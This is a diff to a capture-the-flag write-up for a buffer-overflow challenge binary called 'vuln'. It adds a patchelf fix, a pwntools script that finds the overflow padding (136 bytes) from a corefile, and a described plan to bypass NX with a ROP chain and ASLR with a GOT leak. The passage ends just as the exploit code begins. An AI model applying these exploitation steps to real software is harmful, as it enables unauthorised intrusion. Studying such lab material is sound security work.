@@ -40,9 +40,67 @@ $ pwn checksec vuln
 
 `NX` is enabled, so we can't run our shellcode on the stack. Also, `ASLR` is enabled on the remote TCP service.
 
-To bypass `NX`, we will use a ROPChain. To bypass `ASLR`, we will leak the address of a function (in the GOT) to calculate the base address of `libc` and call the `main` function again to executes our final payload with the right offsets.
+To run the binary, I needed to remove a library with [patchelf](https://github.com/NixOS/patchelf).
 
-Source code :
+```
+$ ls
+libc.so.6  vuln
+$ ldd vuln
+        linux-vdso.so.1 (0x00007ffc9eded000)
+        libc.so.6 => ./libc.so.6 (0x00007f3b9fe00000)
+        /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f3ba03e0000)
+$ ./vuln
+Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!
+
+$ patchelf --remove-rpath /lib64/ld-linux-x86-64.so.2 vuln
+$ ./vuln
+WeLcOmE To mY EcHo sErVeR!
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAa
+^C
+```
+
+Let's try to calculate the size of the padding of the buffer overflow. Source code :
+
+```python
+#!/usr/bin/env python3
+from pwn import process, p64, cyclic, cyclic_find
+
+
+PROGRAM = "./vuln"
+
+def find_padding_size():
+    proc = process(PROGRAM)
+    pattern = cyclic(0xFF)
+
+    proc.sendlineafter(b"WeLcOmE To mY EcHo sErVeR!\n", pattern)
+    proc.wait()
+
+    core = proc.corefile
+    seg_addr = int(f"0x{hex(core.fault_addr)[-8:]}", 16)
+
+    return cyclic_find(seg_addr)
+
+
+if __name__ == "__main__":
+    padding = find_padding_size()
+    print("Padding size:", padding)
+```
+
+Execution :
+
+```
+$ python3 calc_padding.py
+[+] Starting local process './vuln': pid 105001
+[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 105001)
+[+] Parsing corefile...: Done
+...
+Padding size: 136
+```
+
+---
+
+To bypass `NX`, we will use a ROPChain. To bypass `ASLR`, we will leak the address of a function (in the GOT) to calculate the base address of `libc` and call the `main` function again to executes our final payload with the right offsets. Source code :
 
 ```python
 #!/usr/bin/env python3
